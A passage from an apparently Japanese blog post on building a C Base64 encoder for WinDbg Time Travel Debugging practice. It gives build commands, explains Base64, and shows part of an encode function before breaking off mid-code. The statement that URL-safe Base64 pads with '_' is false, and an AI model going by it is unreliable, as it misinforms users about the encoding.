&lt;p&gt;一部の実装については独自にカスタマイズしていますが、ベースは概ね変わりません。&lt;/p&gt;
&lt;p&gt;この記事で紹介しているソースコードについても、参照元を踏襲し&lt;code class=&quot;language-text&quot;&gt;WTFPL v2&lt;/code&gt;で公開しておりますので、自由にお使いください。&lt;/p&gt;
&lt;p&gt;なお、Base64エンコードおよびデコードの結果については保証しませんのであしからず。&lt;/p&gt;
&lt;p&gt;ビルドは以下のコマンドで実施します。&lt;/p&gt;
&lt;p&gt;cl.exeを利用できるように、事前に開発者用コマンドプロンプトを設定しておく必要があります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token function&quot;&gt;git&lt;/span&gt; clone https://github.com/kash1064/Try2WinDbg
&lt;span class=&quot;token builtin class-name&quot;&gt;cd&lt;/span&gt; Try2WinDbg

&lt;span class=&quot;token comment&quot;&gt;# cl.exeを利用できるように、事前に開発者用コマンドプロンプトを設定しておく&lt;/span&gt;
cl /c ./build/c/base64.c
&lt;span class=&quot;token function&quot;&gt;link&lt;/span&gt; /DEBUG /PDB:./build/symbol/base64.pdb ./base64.obj /OUT:./build/bin/base64.exe&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;ビルドができない環境でも、&lt;code class=&quot;language-text&quot;&gt;Try2WinDbg/trace/base64_trace.zip&lt;/code&gt;の中にあるTTDトレースファイルを使うことでTTDを使った解析を行うことができます。&lt;/p&gt;
&lt;p&gt;TTDトレースの読み込みについては以下の記事でまとめてます。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;/windows-windbg-008-time-travel-debugging&quot;&gt;【WinDbg Preview】Time Travel Debuggingで始める新しいデバッグ手法&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;base64の実装について&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64%E3%81%AE%E5%AE%9F%E8%A3%85%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6&quot; aria-label=&quot;base64の実装について permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64の実装について&lt;/h2&gt;
&lt;h3 id=&quot;base64とは&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64%E3%81%A8%E3%81%AF&quot; aria-label=&quot;base64とは permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64とは&lt;/h3&gt;
&lt;p&gt;Base64は、&lt;a href=&quot;https://datatracker.ietf.org/doc/html/rfc4648&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;RFC4648&lt;/a&gt;で定義されているデータのエンコーディング方法です。&lt;/p&gt;
&lt;p&gt;様々なバイト列をASCIIデータに変換することができるので、データの保存や転送など、様々な状況で利用されます。&lt;/p&gt;
&lt;p&gt;Base64は、エンコーディングするバイナリデータを24bit単位で区切り、さらに6bitずつに分割することで、様々なデータを64文字の事前に定義された文字列に変換することができます。&lt;/p&gt;
&lt;p&gt;ここで、エンコーディング元のバイナリデータが24bit単位で区切れない長さの場合、パディングと呼ばれる文字が追加されます。&lt;/p&gt;
&lt;p&gt;パディングの文字はRFCで&lt;code class=&quot;language-text&quot;&gt;=&lt;/code&gt;と定義されていますが、同じくRFCで定義されているURL安全なBase64エンコーディングの場合は&lt;code class=&quot;language-text&quot;&gt;_&lt;/code&gt;が使用されます。&lt;/p&gt;
&lt;h3 id=&quot;base64のソースコード&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#base64%E3%81%AE%E3%82%BD%E3%83%BC%E3%82%B9%E3%82%B3%E3%83%BC%E3%83%89&quot; aria-label=&quot;base64のソースコード permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Base64のソースコード&lt;/h3&gt;
&lt;p&gt;以下が今回使用するBase64プログラムのソースコードです。&lt;/p&gt;
&lt;p&gt;長いので詳細な解説はしません。&lt;/p&gt;
&lt;p&gt;ビルドしたプログラムを実行するとmain関数で定義されたテストが実行されますが、他のプログラムにリンクすることで関数単位で呼び出すことも可能です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;assert.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdlib.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;stdio.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&amp;lt;string.h&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;include&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;base64.h&quot;&lt;/span&gt;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;const&lt;/span&gt; BASE64_TYPE type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
    BASE64_SPEC base64_spec&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;size_t&lt;/span&gt; length&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;cursor&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; lineLength&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; i&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt; j&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// base64_specの初期化&lt;/span&gt;
    base64_spec &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;int&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;BASE64_SPECS_LENGTH&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;type &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; type&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            base64_spec &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; BASE64_SPECS&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// エンコード後の文字列格納領域の確保&lt;/span&gt;
    length &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;size &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// mallocの戻り値は確保したメモリブロックを指すポインタ&lt;/span&gt;
    base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;length&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64 &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token constant&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

    cursor &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    lineLength &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token comment&quot;&gt;// 3文字単位でエンコードを行う(エンコード後は4文字になる)&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; size&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; i &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; j &lt;span class=&quot;token operator&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pad&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pad&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;j &lt;span class=&quot;token operator&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x30&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;4&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x0f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3c&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;pad&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;cursor&lt;span class=&quot;token operator&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64_spec&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;table&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;i &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;2&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x3f&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
